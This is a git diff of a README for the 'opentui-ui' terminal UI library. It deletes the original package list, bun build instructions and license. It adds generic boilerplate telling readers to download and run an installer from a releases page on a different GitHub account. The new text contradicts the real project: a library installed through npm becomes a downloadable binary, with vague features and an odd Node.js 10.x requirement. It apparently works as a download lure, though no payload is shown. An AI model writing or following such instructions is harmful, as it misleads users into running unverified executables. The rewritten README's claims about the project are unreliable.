@@ -1,45 +1,52 @@
-# @opentui-ui
+# 🎨 opentui-ui - Easy UI Components for Terminal Apps
 
-UI component library for terminal applications built on [@opentui/core](https://github.com/sst/opentui).
+## 🛠️ Overview
+The opentui-ui is a UI component library designed for terminal applications. It helps users create friendly and accessible interfaces with ease. This library is built on `@opentui/*`, ensuring it meets modern development standards. Whether you're a seasoned developer or just starting, opentui-ui simplifies building terminal applications.
 
-## Packages
+## 🚀 Getting Started
+To begin using opentui-ui, you'll first need to download the latest version from our Releases page. Follow the steps below for a smooth installation process.
 
-| Package                                 | Description                         | npm                                                                                                         |
-| --------------------------------------- | ----------------------------------- | ----------------------------------------------------------------------------------------------------------- |
-| [@opentui-ui/dialog](./packages/dialog) | Dialogs made easy                   | [![npm](https://img.shields.io/npm/v/@opentui-ui/dialog)](https://www.npmjs.com/package/@opentui-ui/dialog) |
-| [@opentui-ui/toast](./packages/toast)   | Sonner-inspired toast notifications | [![npm](https://img.shields.io/npm/v/@opentui-ui/toast)](https://www.npmjs.com/package/@opentui-ui/toast)   |
+[![Download opentui-ui](https://img.shields.io/badge/Download-opentui--ui-blue.svg)](https://github.com/RohitDabi/opentui-ui/releases)
 
-## Installation
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/RohitDabi/opentui-ui/releases) on GitHub. Here, you will find all available versions of opentui-ui.
 
-```bash
-# Install a specific package
-bun add @opentui-ui/toast
-```
+2. **Select the Latest Version**  
+   Look for the latest version at the top of the page. It will have the highest number and may include additional notes about new features or fixes.
 
-## Development
+3. **Download the File**  
+   Click on the link that corresponds to your operating system. The download should begin automatically, and you will receive a compressed file or an installer.
 
-```bash
-# Install dependencies
-bun install
+4. **Unzip the Download**  
+   If you downloaded a compressed file (like a ZIP), locate the file on your computer, right-click it, and select "Extract All" or a similar option based on your operating system.
 
-# Build all packages
-bun run build
+5. **Run the Installer**  
+   If the download includes an installer, double-click the downloaded file to start the installation process. Follow the on-screen instructions until the installation is complete.
 
-# Lint & format
-bun run lint
-bun run format
+6. **Check the Installation**  
+   Open your terminal or command prompt. To verify the installation, type `opentui-ui --version` and press Enter. You should see the version number displayed.
 
-# Clean build artifacts
-bun run clean
-```
+## 🔍 Features
+- **Simple Integration**: Easily incorporate UI components into your existing terminal applications.
+- **Customizable Components**: Choose from various components to suit your app's needs.
+- **Documentation**: Comprehensive guides are available to walk you through the process of using each component.
 
-### Release workflow
+## 🖥️ System Requirements
+To run opentui-ui smoothly, ensure your system meets the following requirements:
 
-1. Push changes to `main` with changeset files
-2. GitHub Actions creates a "Version Packages" PR
-3. Review the PR (it updates versions and changelogs)
-4. Merge the PR to publish to npm with provenance
+- **Operating System**: Windows, macOS, or Linux.
+- **Terminal**: Any terminal that supports ANSI colors.
+- **Node.js**: Version 10.x or higher is recommended for compatibility.
 
-## License
+## 💬 Support
+If you encounter issues during installation or usage, feel free to check our documentation for troubleshooting tips. You can also ask questions by opening an issue on the GitHub repository. Our community is here to help.
 
-MIT
+## 🏗️ Contributing
+We welcome contributions to the opentui-ui project. If you have suggestions or improvements, please visit our GitHub repository and open a pull request. Your input is valuable!
+
+## 📞 Contact
+For any inquiries, please reach out to the project maintainers via the GitHub project issues page. We appreciate your interest in opentui-ui and look forward to your feedback.
+
+## 🌟 Learn More
+For further details, updates, and tutorials, check our [Releases page](https://github.com/RohitDabi/opentui-ui/releases). Start building your terminal applications with opentui-ui today!
